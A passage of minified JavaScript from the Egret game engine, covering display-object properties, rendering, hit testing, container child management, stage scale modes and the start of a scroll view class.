        a.prototype._setY = function (e) {
            c.NumberUtils.isNumber(e) && this._y != e && (this._y = e, this._setDirty(), this._setParentSizeDirty())
        };
        Object.defineProperty(a.prototype, "scaleX", {
            get: function () {
                return this._scaleX
            }, set: function (e) {
                c.NumberUtils.isNumber(e) && this._scaleX != e && (this._scaleX = e, this._setDirty(), this._setParentSizeDirty())
            }, enumerable: !0,
            configurable: !0
        });
        Object.defineProperty(a.prototype, "scaleY", {
            get: function () {
                return this._scaleY
            }, set: function (e) {
                c.NumberUtils.isNumber(e) && this._scaleY != e && (this._scaleY = e, this._setDirty(), this._setParentSizeDirty())
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "anchorOffsetX", {
            get: function () {
                return this._anchorOffsetX
            }, set: function (e) {
                c.NumberUtils.isNumber(e) && this._anchorOffsetX != e && (this._anchorOffsetX = e, this._setDirty(), this._setParentSizeDirty())
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "anchorOffsetY", {
            get: function () {
                return this._anchorOffsetY
            }, set: function (e) {
                c.NumberUtils.isNumber(e) && this._anchorOffsetY != e && (this._anchorOffsetY = e, this._setDirty(), this._setParentSizeDirty())
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "anchorX", {
            get: function () {
                return this._anchorX
            }, set: function (e) {
                this._setAnchorX(e)
            }, enumerable: !0, configurable: !0
        });
        a.prototype._setAnchorX = function (e) {
            c.NumberUtils.isNumber(e) && this._anchorX != e && (this._anchorX =
                e, this._setDirty(), this._setParentSizeDirty())
        };
        Object.defineProperty(a.prototype, "anchorY", {
            get: function () {
                return this._anchorY
            }, set: function (e) {
                this._setAnchorY(e)
            }, enumerable: !0, configurable: !0
        });
        a.prototype._setAnchorY = function (e) {
            c.NumberUtils.isNumber(e) && this._anchorY != e && (this._anchorY = e, this._setDirty(), this._setParentSizeDirty())
        };
        Object.defineProperty(a.prototype, "visible", {
            get: function () {
                return this._visible
            }, set: function (e) {
                this._setVisible(e)
            }, enumerable: !0, configurable: !0
        });
        a.prototype._setVisible =
            function (e) {
                this._visible != e && (this._visible = e, this._setSizeDirty())
            };
        Object.defineProperty(a.prototype, "rotation", {
            get: function () {
                return this._rotation
            }, set: function (e) {
                c.NumberUtils.isNumber(e) && this._rotation != e && (this._rotation = e, this._setParentSizeDirty())
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "alpha", {
            get: function () {
                return this._alpha
            }, set: function (e) {
                c.NumberUtils.isNumber(e) && this._alpha != e && (this._alpha = e, this._setDirty(), this._setCacheDirty())
            }, enumerable: !0,
            configurable: !0
        });
        Object.defineProperty(a.prototype, "skewX", {
            get: function () {
                return this._skewX
            }, set: function (e) {
                c.NumberUtils.isNumber(e) && this._skewX != e && (this._skewX = e, this._setParentSizeDirty())
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "skewY", {
            get: function () {
                return this._skewY
            }, set: function (e) {
                c.NumberUtils.isNumber(e) && this._skewY != e && (this._skewY = e, this._setParentSizeDirty())
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "touchEnabled", {
            get: function () {
                return this._touchEnabled
            },
            set: function (e) {
                this._setTouchEnabled(e)
            }, enumerable: !0, configurable: !0
        });
        a.prototype._setTouchEnabled = function (e) {
            this._touchEnabled = e
        };
        Object.defineProperty(a.prototype, "scrollRect", {
            get: function () {
                return this._scrollRect
            }, set: function (e) {
                this._setScrollRect(e)
            }, enumerable: !0, configurable: !0
        });
        a.prototype._setScrollRect = function (e) {
            this._scrollRect = e;
            this._setSizeDirty()
        };
        Object.defineProperty(a.prototype, "measuredWidth", {
            get: function () {
                return this._measureBounds().width
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "measuredHeight", {
            get: function () {
                return this._measureBounds().height
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "explicitWidth", {
            get: function () {
                return this._explicitWidth
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "explicitHeight", {
            get: function () {
                return this._explicitHeight
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "width", {
            get: function () {
                return this._getSize(c.Rectangle.identity).width
            }, set: function (e) {
                this._setWidth(e)
            },
            enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "height", {
            get: function () {
                return this._getSize(c.Rectangle.identity).height
            }, set: function (e) {
                this._setHeight(e)
            }, enumerable: !0, configurable: !0
        });
        a.prototype._setWidth = function (e) {
            this._setSizeDirty();
            this._setCacheDirty();
            this._explicitWidth = e;
            this._hasWidthSet = c.NumberUtils.isNumber(e)
        };
        a.prototype._setHeight = function (e) {
            this._setSizeDirty();
            this._setCacheDirty();
            this._explicitHeight = e;
            this._hasHeightSet = c.NumberUtils.isNumber(e)
        };
        a.prototype._draw = function (e) {
            if (this._visible && !this.drawCacheTexture(e)) {
                var a = c.MainContext.__use_new_draw && this._isContainer;
                this._filter && !a && e.setGlobalFilter(this._filter);
                this._colorTransform && !a && e.setGlobalColorTransform(this._colorTransform.matrix);
                e.setAlpha(this.worldAlpha, this.blendMode);
                e.setTransform(this._worldTransform);
                var b = this.mask || this._scrollRect;
                b && !a && e.pushMask(b);
                this._render(e);
                b && !a && e.popMask();
                this._colorTransform && !a && e.setGlobalColorTransform(null);
                this._filter && !a && e.setGlobalFilter(null)
            }
            this.destroyCacheBounds()
        };
        a.prototype._setGlobalFilter = function (e) {
            e.setGlobalFilter(this._filter)
        };
        a.prototype._removeGlobalFilter = function (e) {
            e.setGlobalFilter(null)
        };
        a.prototype._setGlobalColorTransform = function (e) {
            e.setGlobalColorTransform(this._colorTransform.matrix)
        };
        a.prototype._removeGlobalColorTransform = function (e) {
            e.setGlobalColorTransform(null)
        };
        a.prototype._pushMask = function (e) {
            e.setTransform(this._worldTransform);
            var a = this.mask || this._scrollRect;
            a && e.pushMask(a)
        };
        a.prototype._popMask = function (e) {
            e.popMask()
        };
        a.prototype.drawCacheTexture = function (e) {
            if (!1 == this._cacheAsBitmap)return !1;
            var a = this.getBounds(c.Rectangle.identity), b = c.MainContext.instance.rendererContext._texture_scale_factor;
            if (this._cacheDirty || null == this._texture_to_render || Math.round(a.width) != Math.round(this._texture_to_render._sourceWidth * b) || Math.round(a.height) != Math.round(this._texture_to_render._sourceHeight * b))this._cacheDirty = !this._makeBitmapCache();
            if (null == this._texture_to_render)return !1;
            var d = this._texture_to_render, a = d._offsetX, b = d._offsetY, f = d._textureWidth, d = d._textureHeight;
            this._updateTransform();
            e.setAlpha(this.worldAlpha, this.blendMode);
            e.setTransform(this._worldTransform);
            c.RenderFilter.getInstance().drawImage(e, this, 0, 0, f, d, a, b, f, d);
            return !0
        };
        a.prototype._updateTransform = function () {
            this._calculateWorldTransform();
            "updateTransform" == c.MainContext._renderLoopPhase && (this.needDraw || this._texture_to_render || this._cacheAsBitmap) && c.RenderCommand.push(this._draw, this)
        };
        a.prototype._calculateWorldTransform =
            function () {
                var e = this._worldTransform, a = this._parent;
                e.identityMatrix(a._worldTransform);
                this._getMatrix(e);
                var b = this._scrollRect;
                b && e.append(1, 0, 0, 1, -b.x, -b.y);
                this.worldAlpha = a.worldAlpha * this._alpha
            };
        a.prototype._render = function (e) {
        };
        a.prototype.getBounds = function (e, a) {
            void 0 === a && (a = !0);
            var b = this._measureBounds(), d = this._hasWidthSet ? this._explicitWidth : b.width, f = this._hasHeightSet ? this._explicitHeight : b.height;
            this._rectW = b.width;
            this._rectH = b.height;
            this._clearSizeDirty();
            var g = b.x, b = b.y, k =
                0, l = 0;
            a && (0 != this._anchorX || 0 != this._anchorY ? (k = d * this._anchorX, l = f * this._anchorY) : (k = this._anchorOffsetX, l = this._anchorOffsetY));
            this._cacheBounds.initialize(g - k, b - l, d, f);
            d = this._cacheBounds;
            e || (e = new c.Rectangle);
            return e.initialize(d.x, d.y, d.width, d.height)
        };
        a.prototype.destroyCacheBounds = function () {
            this._cacheBounds.x = 0;
            this._cacheBounds.y = 0;
            this._cacheBounds.width = 0;
            this._cacheBounds.height = 0
        };
        a.prototype._getConcatenatedMatrix = function () {
            for (var e = a.identityMatrixForGetConcatenated.identity(),
                     b = this; null != b;) {
                if (0 != b._anchorX || 0 != b._anchorY) {
                    var d = b._getSize(c.Rectangle.identity);
                    e.prependTransform(b._x, b._y, b._scaleX, b._scaleY, b._rotation, b._skewX, b._skewY, d.width * b._anchorX, d.height * b._anchorY)
                } else e.prependTransform(b._x, b._y, b._scaleX, b._scaleY, b._rotation, b._skewX, b._skewY, b._anchorOffsetX, b._anchorOffsetY);
                b._scrollRect && e.prepend(1, 0, 0, 1, -b._scrollRect.x, -b._scrollRect.y);
                b = b._parent
            }
            return e
        };
        a.prototype.localToGlobal = function (e, a, b) {
            void 0 === e && (e = 0);
            void 0 === a && (a = 0);
            var d =
                this._getConcatenatedMatrix();
            d.append(1, 0, 0, 1, e, a);
            b || (b = new c.Point);
            b.x = d.tx;
            b.y = d.ty;
            return b
        };
        a.prototype.globalToLocal = function (e, a, b) {
            void 0 === e && (e = 0);
            void 0 === a && (a = 0);
            var d = this._getConcatenatedMatrix();
            d.invert();
            d.append(1, 0, 0, 1, e, a);
            b || (b = new c.Point);
            b.x = d.tx;
            b.y = d.ty;
            return b
        };
        a.prototype.hitTest = function (e, a, b) {
            void 0 === b && (b = !1);
            if (!this._visible || !b && !this._touchEnabled)return null;
            b = this.getBounds(c.Rectangle.identity, !1);
            e -= b.x;
            a -= b.y;
            return 0 <= e && e < b.width && 0 <= a && a < b.height ? this.mask ||
            this._scrollRect ? this._scrollRect && e > this._scrollRect.x && a > this._scrollRect.y && e < this._scrollRect.x + this._scrollRect.width && a < this._scrollRect.y + this._scrollRect.height || this.mask && this.mask.x <= e && e < this.mask.x + this.mask.width && this.mask.y <= a && a < this.mask.y + this.mask.height ? this : null : this : null
        };
        a.prototype.hitTestPoint = function (e, a, b) {
            e = this.globalToLocal(e, a);
            return b ? (this._hitTestPointTexture || (this._hitTestPointTexture = new c.RenderTexture), b = this._hitTestPointTexture, b.drawToTexture(this), 0 !=
            b.getPixel32(e.x - this._hitTestPointTexture._offsetX, e.y - this._hitTestPointTexture._offsetY)[3] ? !0 : !1) : !!this.hitTest(e.x, e.y, !0)
        };
        a.prototype._getMatrix = function (e) {
            e || (e = c.Matrix.identity.identity());
            var a, b;
            b = this._getOffsetPoint();
            a = b.x;
            b = b.y;
            var d = this.__hack_local_matrix;
            d ? (e.append(d.a, d.b, d.c, d.d, d.tx, d.ty), e.append(1, 0, 0, 1, -a, -b)) : e.appendTransform(this._x, this._y, this._scaleX, this._scaleY, this._rotation, this._skewX, this._skewY, a, b);
            return e
        };
        a.prototype._getSize = function (a) {
            if (this._hasHeightSet &&
                this._hasWidthSet)return this._clearSizeDirty(), a.initialize(0, 0, this._explicitWidth, this._explicitHeight);
            this._measureSize(a);
            this._hasWidthSet && (a.width = this._explicitWidth);
            this._hasHeightSet && (a.height = this._explicitHeight);
            return a
        };
        a.prototype._measureSize = function (a) {
            this._sizeDirty ? (a = this._measureBounds(), this._rectW = a.width, this._rectH = a.height, this._clearSizeDirty()) : (a.width = this._rectW, a.height = this._rectH);
            a.x = 0;
            a.y = 0;
            return a
        };
        a.prototype._measureBounds = function () {
            return c.Rectangle.identity.initialize(0,
                0, 0, 0)
        };
        a.prototype._getOffsetPoint = function () {
            var a = this._anchorOffsetX, b = this._anchorOffsetY;
            if (0 != this._anchorX || 0 != this._anchorY)b = this._getSize(c.Rectangle.identity), a = this._anchorX * b.width, b = this._anchorY * b.height;
            var d = c.Point.identity;
            d.x = a;
            d.y = b;
            return d
        };
        a.prototype._onAddToStage = function () {
            this._stage = c.MainContext.instance.stage;
            c.DisplayObjectContainer.__EVENT__ADD_TO_STAGE_LIST.push(this)
        };
        a.prototype._onRemoveFromStage = function () {
            c.DisplayObjectContainer.__EVENT__REMOVE_FROM_STAGE_LIST.push(this)
        };
        Object.defineProperty(a.prototype, "stage", {
            get: function () {
                return this._stage
            }, enumerable: !0, configurable: !0
        });
        a.prototype.addEventListener = function (e, q, d, h, f) {
            void 0 === h && (h = !1);
            void 0 === f && (f = 0);
            b.prototype.addEventListener.call(this, e, q, d, h, f);
            ((h = e == c.Event.ENTER_FRAME) || e == c.Event.RENDER) && this._insertEventBin(h ? a._enterFrameCallBackList : a._renderCallBackList, q, d, f, this)
        };
        a.prototype.removeEventListener = function (e, q, d, h) {
            void 0 === h && (h = !1);
            b.prototype.removeEventListener.call(this, e, q, d, h);
            ((h =
                e == c.Event.ENTER_FRAME) || e == c.Event.RENDER) && this._removeEventBin(h ? a._enterFrameCallBackList : a._renderCallBackList, q, d, this)
        };
        a.prototype.dispatchEvent = function (a) {
            if (!a._bubbles)return b.prototype.dispatchEvent.call(this, a);
            for (var c = [], d = this; d;)c.push(d), d = d._parent;
            a._reset();
            this._dispatchPropagationEvent(a, c);
            return !a._isDefaultPrevented
        };
        a.prototype._dispatchPropagationEvent = function (a, b, c) {
            c = b.length;
            for (var d = 1, f = c - 1; 0 <= f; f--) {
                var g = b[f];
                a._currentTarget = g;
                a._target = this;
                a._eventPhase = d;
                g._notifyListener(a);
                if (a._isPropagationStopped || a._isPropagationImmediateStopped)return
            }
            g = b[0];
            a._currentTarget = g;
            a._target = this;
            a._eventPhase = 2;
            g._notifyListener(a);
            if (!a._isPropagationStopped && !a._isPropagationImmediateStopped)for (d = 3, f = 1; f < c && (g = b[f], a._currentTarget = g, a._target = this, a._eventPhase = d, g._notifyListener(a), !a._isPropagationStopped && !a._isPropagationImmediateStopped); f++);
        };
        a.prototype.willTrigger = function (a) {
            for (var b = this; b;) {
                if (b.hasEventListener(a))return !0;
                b = b._parent
            }
            return !1
        };
        Object.defineProperty(a.prototype, "cacheAsBitmap", {
            get: function () {
                return this._cacheAsBitmap
            }, set: function (a) {
                (this._cacheAsBitmap = a) ? c.callLater(this._makeBitmapCache, this) : this._texture_to_render = null
            }, enumerable: !0, configurable: !0
        });
        a.prototype._makeBitmapCache = function () {
            this.renderTexture || (this.renderTexture = new c.RenderTexture);
            var a = this.renderTexture.drawToTexture(this);
            this._texture_to_render = a ? this.renderTexture : null;
            return a
        };
        a.prototype._setCacheDirty = function (a) {
            void 0 === a && (a = !0);
            this._cacheDirty =
                a
        };
        a.getTransformBounds = function (a, b) {
            var c = a.x, d = a.y, f = a.width, g = a.height;
            (c || d) && b.appendTransform(0, 0, 1, 1, 0, 0, 0, -c, -d);
            var k = f * b.a, f = f * b.b, l = g * b.c, g = g * b.d, m = b.tx, p = b.ty, r = m, t = m, s = p, u = p;
            (c = k + m) < r ? r = c : c > t && (t = c);
            (c = k + l + m) < r ? r = c : c > t && (t = c);
            (c = l + m) < r ? r = c : c > t && (t = c);
            (d = f + p) < s ? s = d : d > u && (u = d);
            (d = f + g + p) < s ? s = d : d > u && (u = d);
            (d = g + p) < s ? s = d : d > u && (u = d);
            return a.initialize(r, s, t - r, u - s)
        };
        Object.defineProperty(a.prototype, "colorTransform", {
            get: function () {
                return this._colorTransform
            }, set: function (a) {
                this._colorTransform =
                    a
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "filter", {
            get: function () {
                return this._filter
            }, set: function (a) {
                this._filter = a
            }, enumerable: !0, configurable: !0
        });
        a.identityMatrixForGetConcatenated = new c.Matrix;
        a._enterFrameCallBackList = [];
        a._renderCallBackList = [];
        return a
    }(c.EventDispatcher);
    c.DisplayObject = d;
    d.prototype.__class__ = "egret.DisplayObject";
    d = function () {
        function b() {
            this.matrix = null
        }

        b.prototype.updateColor = function (a, e, b, c, d, f, g, k) {
        };
        return b
    }();
    c.ColorTransform = d;
    d.prototype.__class__ =
        "egret.ColorTransform"
})(egret || (egret = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a() {
            b.call(this);
            this._touchChildren = !0;
            this._children = [];
            this._isContainer = !0
        }

        __extends(a, b);
        Object.defineProperty(a.prototype, "touchChildren", {
            get: function () {
                return this._touchChildren
            }, set: function (a) {
                this._touchChildren = a
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "numChildren", {
            get: function () {
                return this._children.length
            }, enumerable: !0, configurable: !0
        });
        a.prototype.setChildIndex = function (a, b) {
            this.doSetChildIndex(a, b)
        };
        a.prototype.doSetChildIndex =
            function (a, b) {
                var d = this._children.indexOf(a);
                0 > d && c.Logger.fatalWithErrorId(1006);
                this._children.splice(d, 1);
                0 > b || this._children.length <= b ? this._children.push(a) : this._children.splice(b, 0, a)
            };
        a.prototype.addChild = function (a) {
            var b = this._children.length;
            a._parent == this && b--;
            return this._doAddChild(a, b)
        };
        a.prototype.addChildAt = function (a, b) {
            return this._doAddChild(a, b)
        };
        a.prototype._doAddChild = function (e, b, d) {
            void 0 === d && (d = !0);
            if (e == this)return e;
            if (0 > b || b > this._children.length)return c.Logger.fatalWithErrorId(1007),
                e;
            var h = e._parent;
            if (h == this)return this.doSetChildIndex(e, b), e;
            if (h) {
                var f = h._children.indexOf(e);
                0 <= f && h._doRemoveChild(f)
            }
            this._children.splice(b, 0, e);
            e._parentChanged(this);
            d && e.dispatchEventWith(c.Event.ADDED, !0);
            if (this._stage)for (e._onAddToStage(), b = a.__EVENT__ADD_TO_STAGE_LIST; 0 < b.length;)b.shift().dispatchEventWith(c.Event.ADDED_TO_STAGE);
            e._setDirty();
            this._setSizeDirty();
            return e
        };
        a.prototype.removeChild = function (a) {
            a = this._children.indexOf(a);
            if (0 <= a)return this._doRemoveChild(a);
            c.Logger.fatalWithErrorId(1008);
            return null
        };
        a.prototype.removeChildAt = function (a) {
            if (0 <= a && a < this._children.length)return this._doRemoveChild(a);
            c.Logger.fatalWithErrorId(1007);
            return null
        };
        a.prototype._doRemoveChild = function (e, b) {
            void 0 === b && (b = !0);
            var d = this._children, h = d[e];
            b && h.dispatchEventWith(c.Event.REMOVED, !0);
            if (this._stage) {
                h._onRemoveFromStage();
                for (var f = a.__EVENT__REMOVE_FROM_STAGE_LIST; 0 < f.length;) {
                    var g = f.shift();
                    g.dispatchEventWith(c.Event.REMOVED_FROM_STAGE);
                    g._stage = null
                }
            }
            h._parentChanged(null);
            d.splice(e, 1);
            this._setSizeDirty();
            return h
        };
        a.prototype.getChildAt = function (a) {
            if (0 <= a && a < this._children.length)return this._children[a];
            c.Logger.fatalWithErrorId(1007);
            return null
        };
        a.prototype.contains = function (a) {
            for (; a;) {
                if (a == this)return !0;
                a = a._parent
            }
            return !1
        };
        a.prototype.swapChildrenAt = function (a, b) {
            0 <= a && a < this._children.length && 0 <= b && b < this._children.length ? this._swapChildrenAt(a, b) : c.Logger.fatalWithErrorId(1007)
        };
        a.prototype.swapChildren = function (a, b) {
            var d = this._children.indexOf(a), h = this._children.indexOf(b);
            -1 == d || -1 == h ? c.Logger.fatalWithErrorId(1008) : this._swapChildrenAt(d, h)
        };
        a.prototype._swapChildrenAt = function (a, b) {
            if (a != b) {
                var c = this._children, d = c[a];
                c[a] = c[b];
                c[b] = d
            }
        };
        a.prototype.getChildIndex = function (a) {
            return this._children.indexOf(a)
        };
        a.prototype.removeChildren = function () {
            for (var a = this._children.length - 1; 0 <= a; a--)this._doRemoveChild(a)
        };
        a.prototype._updateTransform = function () {
            if (this._visible) {
                this._filter && c.RenderCommand.push(this._setGlobalFilter, this);
                this._colorTransform && c.RenderCommand.push(this._setGlobalColorTransform,
                    this);
                var a = this.mask || this._scrollRect;
                a && c.RenderCommand.push(this._pushMask, this);
                b.prototype._updateTransform.call(this);
                if (!this._cacheAsBitmap || !this._texture_to_render)for (var q = 0, d = this._children.length; q < d; q++)this._children[q]._updateTransform();
                a && c.RenderCommand.push(this._popMask, this);
                this._colorTransform && c.RenderCommand.push(this._removeGlobalColorTransform, this);
                this._filter && c.RenderCommand.push(this._removeGlobalFilter, this)
            }
        };
        a.prototype._render = function (a) {
            if (!c.MainContext.__use_new_draw)for (var b =
                0, d = this._children.length; b < d; b++)this._children[b]._draw(a)
        };
        a.prototype._measureBounds = function () {
            for (var a = 0, b = 0, d = 0, h = 0, f = this._children.length, g = 0; g < f; g++) {
                var k = this._children[g];
                if (k._visible) {
                    var l = k.getBounds(c.Rectangle.identity, !1), m = l.x, p = l.y, r = l.width, l = l.height, k = k._getMatrix(), k = c.DisplayObject.getTransformBounds(c.Rectangle.identity.initialize(m, p, r, l), k), m = k.x, p = k.y, r = k.width + k.x, k = k.height + k.y;
                    if (m < a || 0 == g)a = m;
                    if (r > b || 0 == g)b = r;
                    if (p < d || 0 == g)d = p;
                    if (k > h || 0 == g)h = k
                }
            }
            return c.Rectangle.identity.initialize(a,
                d, b - a, h - d)
        };
        a.prototype.hitTest = function (a, q, d) {
            void 0 === d && (d = !1);
            var h;
            if (!this._visible)return null;
            if (this._scrollRect) {
                if (a < this._scrollRect.x || q < this._scrollRect.y || a > this._scrollRect.x + this._scrollRect.width || q > this._scrollRect.y + this._scrollRect.height)return null
            } else if (this.mask && (this.mask.x > a || a > this.mask.x + this.mask.width || this.mask.y > q || q > this.mask.y + this.mask.height))return null;
            for (var f = this._children, g = this._touchChildren, k = f.length - 1; 0 <= k; k--) {
                var l = f[k], m = l._getMatrix(), p = l._scrollRect;
                p && m.append(1, 0, 0, 1, -p.x, -p.y);
                m.invert();
                m = c.Matrix.transformCoords(m, a, q);
                if (l = l.hitTest(m.x, m.y, !0)) {
                    if (!g)return this;
                    if (l._touchEnabled && g)return l;
                    h = this
                }
            }
            return h ? h : this._texture_to_render ? b.prototype.hitTest.call(this, a, q, d) : null
        };
        a.prototype._onAddToStage = function () {
            b.prototype._onAddToStage.call(this);
            for (var a = this._children.length, c = 0; c < a; c++)this._children[c]._onAddToStage()
        };
        a.prototype._onRemoveFromStage = function () {
            b.prototype._onRemoveFromStage.call(this);
            for (var a = this._children.length,
                     c = 0; c < a; c++)this._children[c]._onRemoveFromStage()
        };
        a.prototype.getChildByName = function (a) {
            for (var b = this._children, c = b.length, d, f = 0; f < c; f++)if (d = b[f], d.name == a)return d;
            return null
        };
        a.__EVENT__ADD_TO_STAGE_LIST = [];
        a.__EVENT__REMOVE_FROM_STAGE_LIST = [];
        return a
    }(c.DisplayObject);
    c.DisplayObjectContainer = d;
    d.prototype.__class__ = "egret.DisplayObjectContainer"
})(egret || (egret = {}));
(function (c) {
    var d = function () {
        function b() {
        }

        b.NO_BORDER = "noBorder";
        b.NO_SCALE = "noScale";
        b.SHOW_ALL = "showAll";
        b.EXACT_FIT = "exactFit";
        return b
    }();
    c.StageScaleMode = d;
    d.prototype.__class__ = "egret.StageScaleMode";
    d = function () {
        function b() {
        }

        b.FIXED_WIDTH = 1;
        b.FIXED_HEIGHT = 2;
        return b
    }();
    c.NoBorderMode = d;
    d.prototype.__class__ = "egret.NoBorderMode"
})(egret || (egret = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a(a, c) {
            void 0 === a && (a = 480);
            void 0 === c && (c = 800);
            b.call(this);
            this._changeSizeDispatchFlag = !0;
            this._scaleMode = "";
            this._stageHeight = this._stageWidth = NaN;
            this.touchEnabled = !0;
            this._stage = this;
            this._stageWidth = a;
            this._stageHeight = c
        }

        __extends(a, b);
        a.prototype.invalidate = function () {
            a._invalidateRenderFlag = !0
        };
        Object.defineProperty(a.prototype, "scaleMode", {
            get: function () {
                return this._scaleMode
            }, set: function (a) {
                this._scaleMode != a && (this._scaleMode = a, this.setResolutionPolicy())
            },
            enumerable: !0, configurable: !0
        });
        a.prototype.changeSize = function () {
            this._changeSizeDispatchFlag && (this.setResolutionPolicy(), this.dispatchEventWith(c.Event.RESIZE))
        };
        a.prototype.setResolutionPolicy = function () {
            var e = a.SCALE_MODE_ENUM[this._scaleMode];
            if (!e)throw Error(c.getString(1024));
            var b = new c.EqualToFrame, e = new c.ResolutionPolicy(b, e);
            c.StageDelegate.getInstance()._setResolutionPolicy(e);
            this._stageWidth = c.StageDelegate.getInstance()._stageWidth;
            this._stageHeight = c.StageDelegate.getInstance()._stageHeight
        };
        Object.defineProperty(a.prototype, "stageWidth", {
            get: function () {
                return this._stageWidth
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "stageHeight", {
            get: function () {
                return this._stageHeight
            }, enumerable: !0, configurable: !0
        });
        a.prototype.hitTest = function (a, b, d) {
            if (!this._touchEnabled)return null;
            var h;
            if (!this._touchChildren)return this;
            d = this._children;
            for (var f = d.length - 1; 0 <= f; f--) {
                h = d[f];
                var g = h._getMatrix(), k = h._scrollRect;
                k && g.append(1, 0, 0, 1, -k.x, -k.y);
                g.invert();
                g = c.Matrix.transformCoords(g,
                    a, b);
                if ((h = h.hitTest(g.x, g.y, !0)) && h._touchEnabled)return h
            }
            return this
        };
        a.prototype.getBounds = function (a) {
            a || (a = new c.Rectangle);
            return a.initialize(0, 0, this._stageWidth, this._stageHeight)
        };
        a.prototype._updateTransform = function () {
            for (var a = 0, b = this._children.length; a < b; a++)this._children[a]._updateTransform()
        };
        Object.defineProperty(a.prototype, "focus", {
            get: function () {
                return null
            }, enumerable: !0, configurable: !0
        });
        a.registerScaleMode = function (e, b, d) {
            a.SCALE_MODE_ENUM[e] && !d ? c.Logger.warningWithErrorId(1009,
                e) : a.SCALE_MODE_ENUM[e] = b
        };
        a._invalidateRenderFlag = !1;
        a.SCALE_MODE_ENUM = {};
        return a
    }(c.DisplayObjectContainer);
    c.Stage = d;
    d.prototype.__class__ = "egret.Stage"
})(egret || (egret = {}));
egret.Stage.SCALE_MODE_ENUM[egret.StageScaleMode.NO_SCALE] = new egret.NoScale;
egret.Stage.SCALE_MODE_ENUM[egret.StageScaleMode.SHOW_ALL] = new egret.ShowAll;
egret.Stage.SCALE_MODE_ENUM[egret.StageScaleMode.NO_BORDER] = new egret.FixedWidth;
egret.Stage.SCALE_MODE_ENUM[egret.StageScaleMode.EXACT_FIT] = new egret.FullScreen;
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a(a) {
            void 0 === a && (a = null);
            b.call(this);
            this._lastTouchPosition = new c.Point(0, 0);
            this._touchStartPosition = new c.Point(0, 0);
            this._scrollStarted = !1;
            this._lastTouchTime = 0;
            this._lastTouchEvent = null;
            this._velocitys = [];
            this._isVTweenPlaying = this._isHTweenPlaying = !1;
            this._vScrollTween = this._hScrollTween = null;
            this.scrollBeginThreshold = 10;
            this.scrollSpeed = 1;
            this._content = null;
            this._horizontalScrollPolicy = this._verticalScrollPolicy = "auto";
            this._scrollTop = this._scrollLeft =
                0;
            this._vCanScroll = this._hCanScroll = !1;
            this.touchBeginTimer = this.delayTouchBeginEvent = null;
            this.touchEnabled = !0;
            a && this.setContent(a)
        }

        __extends(a, b);
        a.prototype.setContent = function (a) {
            this._content !== a && (this.removeContent(), a && (this._content = a, b.prototype.addChild.call(this, a), this._addEvents()))
        };
        a.prototype.removeContent = function () {
            this._content && (this._removeEvents(), b.prototype.removeChildAt.call(this, 0));
            this._content = null
        };
        Object.defineProperty(a.prototype, "verticalScrollPolicy", {
            get: function () {
                return this._verticalScrollPolicy
            },
            set: function (a) {
                a != this._verticalScrollPolicy && (this._verticalScrollPolicy = a)
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "horizontalScrollPolicy", {
            get: function () {
                return this._horizontalScrollPolicy
            }, set: function (a) {
                a != this._horizontalScrollPolicy && (this._horizontalScrollPolicy = a)
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "scrollLeft", {
            get: function () {
                return this._scrollLeft
            }, set: function (a) {
                a != this._scrollLeft && (this._scrollLeft = a, this._validatePosition(!1,
                    !0), this._updateContentPosition())
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "scrollTop", {
            get: function () {
                return this._scrollTop
            }, set: function (a) {
                a != this._scrollTop && (this._scrollTop = a, this._validatePosition(!0, !1), this._updateContentPosition())
            }, enumerable: !0, configurable: !0
        });
        a.prototype.setScrollPosition = function (a, b, c) {
            void 0 === c && (c = !1);
            if (!c || 0 != a || 0 != b)if (c || this._scrollTop != a || this._scrollLeft != b) {
                if (c) {
                    c = this._isOnTheEdge(!0);
                    var d = this._isOnTheEdge(!1);
                    this._scrollTop +=
                        c ? a / 2 : a;
                    this._scrollLeft += d ? b / 2 : b
                } else this._scrollTop = a, this._scrollLeft = b;
                this._validatePosition(!0, !0);
                this._updateContentPosition()
            }
        };
        a.prototype._isOnTheEdge = function (a) {
            void 0 === a && (a = !0);
            var b = this._scrollTop, c = this._scrollLeft;
            return a ? 0 > b || b > this.getMaxScrollTop() : 0 > c || c > this.getMaxScrollLeft()
        };
        a.prototype._validatePosition = function (a, b) {
            void 0 === a && (a = !1);
            void 0 === b && (b = !1);
            if (a) {
                var c = this.height, d = this._getContentHeight();
                this._scrollTop = Math.max(this._scrollTop, (0 - c) / 2);
                this._scrollTop =
                    Math.min(this._scrollTop, d > c ? d - c / 2 : c / 2)
            }
            b && (c = this.width, d = this._getContentWidth(), this._scrollLeft = Math.max(this._scrollLeft, (0 - c) / 2), this._scrollLeft = Math.min(this._scrollLeft, d > c ? d - c / 2 : c / 2))
        };
        a.prototype._setWidth = function (a) {
